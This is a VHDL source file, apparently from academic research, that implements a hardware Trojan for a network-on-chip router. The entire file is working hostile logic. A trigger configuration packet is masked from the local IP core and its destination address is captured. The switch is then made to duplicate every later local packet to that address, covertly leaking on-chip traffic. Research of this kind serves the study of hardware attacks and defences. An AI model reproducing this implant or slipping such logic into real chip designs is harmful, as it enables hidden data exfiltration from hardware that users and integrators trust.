--------------------------------------------------------------------------------------
-- DESIGN UNIT  : Hardware Trojan                                                   --
-- DESCRIPTION  :                                                                   --
-- AUTHOR       : Geaninne Marchezan Lopes and Iaçanã I. Weber                      --
-- CREATED      : Apr 2019                                                          --
-- VERSION      : v0.1                                                              --
--------------------------------------------------------------------------------------

library ieee;
use ieee.std_logic_1164.all;
use work.standards.all;

entity HardwareTrojan is 
    port(
        clock : 		in std_logic;
        reset :	 		in std_logic;
        data_in :	 	in regflit;         -- to read the information on the local port
        destAddr :      in arrayNportless1_regmetadeflit;
        dupFlit :       out regflit;
        sending:        in std_logic;
        duplicate : 	out std_logic;      -- to inform the SW that the packet must be duplicated
        configPckt : 	in std_logic_vector(NPORT-2 downto 0);        -- informs the presence of a config packet inside the buffer
        turnOff :       in std_logic_vector(NPORT-2 downto 0);
        n_maskPckt_o :  out std_logic
        );
end HardwareTrojan;

architecture HardwareTrojan of HardwareTrojan is

type HTState is (S0, waiting, readDestination, waitHeader, transmitting);
signal state : HTState;
signal destination, dest : regmetadeflit;
signal n_maskPckt, turnOff_or : std_logic;
signal zeros : std_logic_vector(METADEFLIT-2 downto 0);

begin

    process(clock, reset)
    begin
        if reset = '1' then
            state <= S0;
            destination <= (others=>'0');
        elsif rising_edge(clock) then
            case state is
                -- Reset state
                when S0 =>
                    state <= waiting;

                -- Waiting the awakening packet
                when waiting =>
                    if n_maskPckt = '0' and turnOff_or = '0' then -- trocar para pckt -- use n_
                        state <= readDestination;
                    else
                        state <= waiting;
                    end if;

                -- Stores the Destination address to replace it in the duplicated packet
                when readDestination =>
                    destination <= dest;
                    state <= waitHeader;

                -- Waits until the LOCAL IP send a new packet
                when waitHeader =>
                    if turnOff_or = '1' then
                        state <= waiting;
                    elsif sending = '1' then -- ADICIONAR O CREDITO AQUI! PARA GARANTIR A LEITURA
                        state <= transmitting;
                    else
                        state <= waitHeader;
                    end if;

                when transmitting =>
                    if turnOff_or = '1' then
                        state <= waiting;
                    elsif sending = '1' then
                        state <= transmitting;
                    else
                        state <= waitHeader;
                    end if;                    

                when OTHERS =>
                    state <= S0;
            end case;
        end if;
    end process;

    -- Duplicated packet header
    zeros <= (others => '0');
    dupFlit <= zeros & '1' & destination when state = waitHeader else data_in;

    -- Informa o Switch Control que ele deve rotear os próximos pacotes locais para duas saídas
    duplicate <= '1' when state = waitHeader or state = transmitting else '0';

    -- Mascara o pacote de configuração para o IP!
    n_maskPckt <= '0' when configPckt(0) = '1' or configPckt(1) = '1' or configPckt(2) = '1' or configPckt(3) = '1' or turnOff_or = '1' else '1';
    turnOff_or <= '1' when turnOff(0) = '1' or turnOff(1) = '1' or turnOff(2) = '1' or turnOff(3) = '1' else '0';
    n_maskPckt_o <= n_maskPckt;

    -- Mux to define the address source
    dest <= destAddr(0) when configPckt(0) = '1' else
            destAddr(1) when configPckt(1) = '1' else
            destAddr(2) when configPckt(2) = '1' else
            destAddr(3);

end HardwareTrojan;